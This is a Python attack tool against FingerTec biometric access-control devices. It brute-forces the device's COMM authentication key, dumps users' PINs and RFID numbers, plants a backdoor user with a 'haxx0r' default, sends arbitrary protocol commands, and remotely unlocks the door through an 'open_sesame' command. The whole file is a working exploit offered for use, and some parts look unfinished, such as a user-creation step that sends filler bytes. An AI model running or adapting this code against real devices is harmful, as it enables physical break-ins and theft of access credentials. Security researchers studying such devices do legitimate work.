#!/usr/bin/python

from struct import pack, unpack
import socket
import pdb
import time
import sys
import argparse


def create_user(args):
    sys.stdout.write('Connecting...\n')
    f = Fingertec(args.host, comm_id = args.commkey)
    f.connect()
    f.disable_device()
    res = f.create_user(int(args.user_id), args.user_name, args.pin, int(args.rfid))
    f.enable_device()
    f.disconnect()


def list_users(args):
    sys.stdout.write('Connecting...\n') 
    f = Fingertec(args.host, comm_id = args.commkey)
    if args.brute_force:
        f.connect(bf='bf_enabled', start=args.start, end=args.end)
    else:
        f.connect()
    f.disable_device()
    res = f.list_users()
    f.enable_device()
    f.disconnect()


def brute_force(args):
    sys.stdout.write('Initiating brute force...\n')
    f = Fingertec(args.host)
    f.connect(bf='bf_enabled', start=args.start, end=args.end)
    f.disconnect()

def send_command(args):
    sys.stdout.write('Connecting...\n')
    f = Fingertec(args.host, comm_id = args.commkey)
    f.connect()
    f.disable_device()
    data = args.data.encode()
    if args.fuzz:
        data *= args.fuzz
    res = f.send_command(args.command, args.data.encode())
    print(res)
    f.enable_device()
    f.disconnect()

def open_sesame(args):
    sys.stdout.write('Connecting...\n')
    f = Fingertec(args.host, comm_id = args.commkey)
    f.connect()
    f.disable_device()
    sys.stdout.write('Unlocking door for %s seconds\n' % args.delay)
    f.unlock_device(args.delay)
    f.enable_device()
    f.disconnect()

class Fingertec():
    ''' This class handles communication with the FingerTec device '''

    def __init__(self, host, port=4370, comm_id=0):
        self.host = host
        self.port = port
        self.chksum = 0
        self.reply = 65534
        self.session_id = 0
        self.comm_id = comm_id
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(3)

    def pad_string(self, s, l):
        return s + ((l - len(s))*' ')

    def get_chksum(self, cmd_list, command_str):
        cmd_str = [unpack('H', command_str[a:a+2])[0] for a in range(0, int(len(command_str)/2)*2, 2)]
        if len(command_str)%2:
            cmd_str += [command_str[-1]]
        return (~sum(cmd_list+cmd_str))%65535


    def create_auth_key(self, comm_id, session_id):
        # This was all pulled from the Ingress application, using the comms.dll calls
        #
        # First it takes the comm ID, and reverses it bitwise as a 32-bit integer. For
        # example:
        # 0b00000000101010101111111100000000 becomes 0b00000000111111110101010100000000
        res = int('{:032b}'.format(comm_id)[::-1], 2)

        # Next it adds the session ID in.
        res += session_id
        
        # Then it XORs it against a static XOR key
        xor = 0x4f534b5a
        res ^= xor

        # Finally it swaps the first and second half, so
        # 0xdeadbeef becomes 0xbeefdead
        hex_res = '0'*(8-(len(hex(res))-2)) + hex(res)[2:]
        res = int(hex_res[4:6] + '00' + hex_res[:4], 16)

        # The software also did a final XOR against the least significant byte from the Windows
        # getTickCount function as a sort of cheap RNG.  It was XOR'd against bytes 1, 3, and 4,
        # while it replaced byte 2.  We just set 2 as '00' and skip the XOR altogether.
        return res

    def create_header(self, command, command_str):

        self.chksum = self.get_chksum([command, self.chksum, self.session_id, self.reply], command_str)
        self.reply = (self.reply +1) % 65535
        buf = pack('HHHH', command, self.chksum, self.session_id, self.reply)
        return buf + command_str

    def send_command(self, command, command_str=b'', bf=False, start=1, end=999999):

        payload = self.create_header(command, command_str)
        self.sock.sendto(payload, (self.host, self.port))
        data, address = self.sock.recvfrom(1024)

        resp = unpack('HHHH', data[:8])
        self.chksum = 0
        self.reply = resp[3]
        self.session_id = resp[2]
        if resp[0] == 2000:
            pass
        elif resp[0] == 2001:
            print("Command received Error")
        elif resp[0] == 2002:
            print("Command DATA")
        elif resp[0] == 2005:
            # pdb.set_trace()
            if self.comm_id:
                if command != 1102:# and not bf:
                    self.authorize(self.comm_id, self.session_id)
                else:
                    # print("Unauth")
                    pdb.set_trace()
                # data = self.send_command(command, command_str)
            else:
                # pass
                if bf == 'bf_enabled':
                    sys.stdout.write('COMM Key not 0.  Brute forcing...\n')
                    for i in range(start, end):
                        if self.try_auth_code(i):
                            print("Correct COMM Key Found: %s" % i)
                            self.comm_id = i
                            break

                        else:
                            print("Tried: %s" % i)
                else:
                    sys.stdout.write('COMM Key not correct, and brute force not enabled.  Exiting.\n')
                    sys.exit(1)

        return data

    def try_auth_code(self, code):
        command = 1102
        if self.session_id: # connection already established
            command_int = self.create_auth_key(code, self.session_id)
            command_str = pack('I', command_int)
            
            payload = self.create_header(command, command_str)
            self.sock.sendto(payload, (self.host, self.port))
            data, address = self.sock.recvfrom(1024)

            resp = unpack('HHHH', data[:8])
            self.chksum = 0
            self.reply = resp[3]
            self.session_id = resp[2]
            if resp[0] == 2000:
                return True

            elif resp[0] == 2005:
                return False

        return False


    def connect(self, bf=False, start=1, end=999999):
        self.send_command(1000, bf=bf, start=start, end=end)

    def disconnect(self):
        self.send_command(1001)

    def authorize(self, comm_id, session_id):

        auth_key = self.create_auth_key(comm_id, session_id)
        auth_code = pack('I', auth_key)
        self.send_command(1102, auth_code)

    def device_info(self, cmd):
        data = self.send_command(11, cmd+b'\x00')

        resp = data[9+len(cmd):-1]
        return resp

    def disable_device(self):
        data = self.send_command(1003, b'\x00\x00\x00\x00')

    def enable_device(self):
        data = self.send_command(1002, b'\x00\x00')

    def get_version(self):
        return self.send_command(1100, b'')[9:]

    def unlock_device(self, delay):
        res = self.send_command(31, pack('H', delay))
        return res


    def list_users(self):


        res = self.send_command(1503, b'\x01\t\x00\x05\x00\x00\x00\x00\x00\x00\x00')
        print(res)
        data_e = [res[i:i+28] for i in range(12, len(res), 28)]
        try:
            print("| ID        | Privilege | PIN   | RFID       | Username |")
            print("|-----------+-----------+-------+------------+----------|")
            for d in data_e:
                
                user_id = unpack('I', d[24:28])[0]
                priv = d[2]
                user_pin = d[3:8].replace(b'\x00', b'')
                if user_pin.find(b'\xff') > -1:
                    user_pin = ''
                else:
                    user_pin = user_pin.decode()
                user_name = d[8:16]
                rfid = unpack('I', d[16:20])[0]
                if user_name.find(b'\x00') > -1:
                    user_name = user_name[:user_name.find(b'\x00')]
                user_name = user_name.decode()

                print("| %s | %s | %s | %s | %s |" % (self.pad_string(str(user_id), 9) , self.pad_string(str(priv), 9), self.pad_string(user_pin, 5), self.pad_string(str(rfid), 10), self.pad_string(user_name, 8)))
        except:
            print('Format not understood')
        return res


    def create_user(self, user_id, user_name, pin, rfid_num=0):

        record_id = pack('H', user_id )
        if len(user_name) > 8:
            user_name = user_name[:8]  # Trim usernames to 8 characters

        if len(pin) > 5:
            pin = pin[:5]               # Trim PIN to 5 characters

        b_name = user_name.encode() + ((8 - len(user_name)) * b'\x00' ) # Pad username to 8 characters with \x00 padding
        rfid = pack('I', int(rfid_num)) # Changing it from string to little endian
        b_pin = pin.encode() + ((5 - len(pin)) * b'\x00')  # Padding PIN to 5 bytes as text with \x00 padding

        record = record_id + b'\x06' + b_pin + b_name + rfid + (b'\x00'*4)+ record_id + b'\x00\x00'
        
        self.send_command(1500,b'F\x00\x00\x00')  # Init write mode?
        res = self.send_command(1501, b'A'*1000 )#b':\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + record + b'A'*50)
        self.send_command(110, b'\x0c\x00\x00\x00\x00\x00\x08\x00') # Save changes

        sys.stdout.write('User created successfully.\n')
        sys.stdout.write('User ID:%s\n' % user_id)
        sys.stdout.write('PIN:%s\n' % pin)
        sys.stdout.write('RFID:%s\n' % rfid_num)
        sys.stdout.write('User Name:%s\n' % user_name)

        return res

# This is setting up the argument parser and help system.
parser = argparse.ArgumentParser()
subparsers = parser.add_subparsers()

create_user_parser = subparsers.add_parser('create_user')
create_user_parser.add_argument('host', help='FingerTec Device IP address')
create_user_parser.add_argument('--user_id', default='1337', help='User ID to create.  Default is 1337.')
create_user_parser.add_argument('--user_name', default='haxx0r', help='User name - max of 8 letters.')
create_user_parser.add_argument('--pin', default='1337', help='PIN - max of 5 characters.  Default 1337.')
create_user_parser.add_argument('--rfid', default='0', help='RFID card number.')
create_user_parser.add_argument('--commkey', default=0, type=int, help="COMM Key")

create_user_parser.set_defaults(func=create_user)

list_users_parser = subparsers.add_parser('list_users')
list_users_parser.add_argument('host', help='FingerTec Device IP address')
list_users_parser.add_argument('--brute_force', action='store_true', help="Brute force comm key is necessary")
list_users_parser.add_argument('--commkey', default=0, type=int, help="COMM Key")
list_users_parser.add_argument('--start', default=1, type=int, help="Start comm key id")
list_users_parser.add_argument('--end', default=999999, type=int, help="End comm key id")
list_users_parser.set_defaults(func=list_users)

brute_force_parser = subparsers.add_parser('brute_force')
brute_force_parser.add_argument('host', help='FingerTec Device IP address')
brute_force_parser.add_argument('--brute_force', action='store_true', help="Brute force comm key is necessary")
brute_force_parser.add_argument('--start', default=1, type=int, help="Start comm key id")
brute_force_parser.add_argument('--end', default=999999, type=int, help="End comm key id")
brute_force_parser.set_defaults(func=brute_force)

send_command_parser = subparsers.add_parser('send_command')
send_command_parser.add_argument('host', help='FingerTec Device IP address')
send_command_parser.add_argument('command', help='Command (integer)', type=int)
send_command_parser.add_argument('data', help='Additional data (args) sent')
send_command_parser.add_argument('--commkey', default=0, type=int, help="COMM Key")
# send_command_parser.add_argument('--fuzz', default=0, type=int, help="Fuzz multiplier (for testing)")
send_command_parser.set_defaults(func=send_command)

open_sesame_parser = subparsers.add_parser('open_sesame')
open_sesame_parser.add_argument('host', help='FingerTec Device IP address')
open_sesame_parser.add_argument('delay', type=int, help='Delay (in seconds) to keep the door open', default=5)
open_sesame_parser.add_argument('--commkey', default=0, type=int, help="COMM Key")
open_sesame_parser.set_defaults(func=open_sesame)
if __name__ == "__main__":
    
    args = parser.parse_args()
    
    if len(sys.argv) > 1:
        args.func(args)
    else:
        parser.print_help()
    


